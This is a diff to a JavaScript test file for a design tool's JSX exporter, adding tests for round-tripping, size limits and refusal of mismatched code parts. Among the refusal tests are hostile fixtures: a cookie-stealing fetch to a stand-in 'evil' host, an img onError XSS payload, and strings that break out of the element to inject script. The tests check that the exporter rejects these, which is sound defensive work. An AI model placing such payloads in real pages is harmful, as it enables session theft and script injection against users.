@@ -1,7 +1,7 @@
 import test from "node:test";
 import assert from "node:assert/strict";
 
-import { designToCode } from "../packages/code-ir/src/index.ts";
+import { buildCodeIr, designToCode } from "../packages/code-ir/src/index.ts";
 import { textLayerOf } from "../packages/document-model/src/index.mjs";
 import { exportJsx, importJsx } from "../packages/studio-host/src/code.ts";
 
@@ -51,6 +51,33 @@ test("what looks like an expression but is words stays words", () => {
   assert.match(exportJsx(typed, "p").code, /<p>&#123;title&#125;<\/p>/u, "braces a person typed are not code");
 });
 
+test("export reads back: the code parses, and adjacent runs keep their words", () => {
+  for (const jsx of ["<p>{title}</p>", "<p>Hi <b>you</b> {name}</p>", "<p>{`a\n  b`}</p>", "<p>&nbsp;x&nbsp;<b>y</b></p>", "<ul>{items.map((item) => <li>{item}</li>)}</ul>"]) {
+    assert.ok(buildCodeIr([{ path: "A.tsx", content: exportOf(`export function A() { return ${jsx}; }`) }]).rootIds.length === 1, jsx);
+  }
+  // Two runs beside an element: no space where the line break is.
+  const adjacent = exportOf("export function A() { return <p>a{\"b\"}<b>c</b></p>; }");
+  assert.match(adjacent, /<span>a<\/span>\s+<span>b<\/span>\s+<b>c<\/b>/u);
+  // A run with a no-break space at its edge is a literal, which every JSX parser keeps.
+  assert.match(exportOf("export function A() { return <p>&nbsp;x<b>y</b></p>; }"), /\{"\u00a0x"\}/u);
+});
+
+test("the result counts the code parts, and a document cannot make the export take long", () => {
+  const counted = imported("export function A() { return <p>{a} and {b}</p>; }");
+  assert.equal(exportJsx(counted.document, counted.rootId).codeParts, 2);
+  const none = imported("export function A() { return <p>words</p>; }");
+  assert.equal(exportJsx(none.document, none.rootId).codeParts, 0);
+  // Over the bound in total, each under what one source file can hold.
+  const big = `{f("${"x".repeat(200 * 1024)}")}`;
+  const shown = `{${"f(\"" + "x".repeat(10)}}`;
+  const nodes = { p: { id: "p", type: "element", parentId: null, children: [], props: { tag: "p" }, metadata: {} } };
+  for (let index = 0; index < 6; index += 1) {
+    nodes[`t${index}`] = { id: `t${index}`, type: "text", parentId: "p", children: [], props: { text: shown, codeExpression: big }, metadata: {} };
+    nodes.p.children.push(`t${index}`);
+  }
+  assert.throws(() => exportJsx({ id: "d", revision: 0, rootIds: ["p"], nodes }, "p"), (error) => error.code === "export-too-large" || error.code === "export-refused");
+});
+
 test("export is a fixed point: bringing exported code in again exports the same code", () => {
   for (const jsx of ["<p>{title}</p>", "<p>Hello {name}!</p>", "<p>Hi <b>you</b> {name}</p>", "<ul>{items.map((item) => <li>{item}</li>)}</ul>", `<p>${longCall}</p>`]) {
     const once = exportOf(`export function A() { return ${jsx}; }`);
@@ -72,14 +99,20 @@ test("a part that cannot be written exactly refuses the export", () => {
     mutate(document.nodes[document.nodes[rootId].children[0]]);
     assert.throws(() => exportJsx(document, rootId), (error) => error.code === "export-refused" && pattern.test(error.message));
   };
-  refused((layer) => { layer.props.text = "Now words"; }, /is code and was changed here/u);
+  refused((layer) => { layer.props.text = "Now words"; }, /is not the code this layer holds, \{title\}/u);
   // Bound before the exact source was recorded: the display copy is not the code.
   refused((layer) => { delete layer.props.codeExpression; layer.props.codeSource = { tag: "#expression", code: ["{title}"] }; }, /is not recorded/u);
-  refused((layer) => { layer.props.codeExpression = { shown: "{title}" }; }, /is not recorded/u);
+  refused((layer) => { layer.props.codeExpression = { source: "{title}", shown: "{title}" }; }, /is not recorded/u);
+  // A document that shows one thing and holds another does not export what nobody saw.
+  refused((layer) => { layer.props.codeExpression = "{(fetch('//evil?'+document.cookie),title)}"; }, /is not the code this layer holds/u);
+  refused((layer) => { layer.props.text = "Hello"; layer.props.codeExpression = "{<img src='x' onError={()=>alert(1)}/>}"; }, /is not the code this layer holds/u);
   // A document that claims more than one child, or closes the element, writes none of it.
-  for (const source of ["{a}</p><script>evil()</script><p>{b}", "{a}</>;evil();<>{b}", "{a}{b}", "{a} text", "text", "{\"words\"}", "{/* none */}", "{a", ""]) {
-    refused((layer) => { layer.props.codeExpression = { source, shown: "{title}" }; }, /\{…\} part/u);
+  for (const source of ["{a}</p><script>evil()</script><p>{b}", "{a}</>;evil();<>{b}", "{a}</>; } function q() { return <>{b}", "{a}{b}", "{a} text", "text", "{\"words\"}", "{/* none */}", "{a", "", "{await load()}"]) {
+    refused((layer) => { layer.props.codeExpression = source; }, /\{…\} part/u);
   }
+  // Await is not valid in the plain function export writes; inside an async function of its own it is.
+  assert.throws(() => exportOf("export async function A() { return <p>{await load()}</p>; }"), (error) => error.code === "export-refused");
+  assert.equal(exportOf("export function A() { return <p>{(async () => await x)()}</p>; }"), wrap("<p>{(async () => await x)()}</p>"));
 });
 
 test("the design normal form takes a part only as a child, and only as itself", () => {
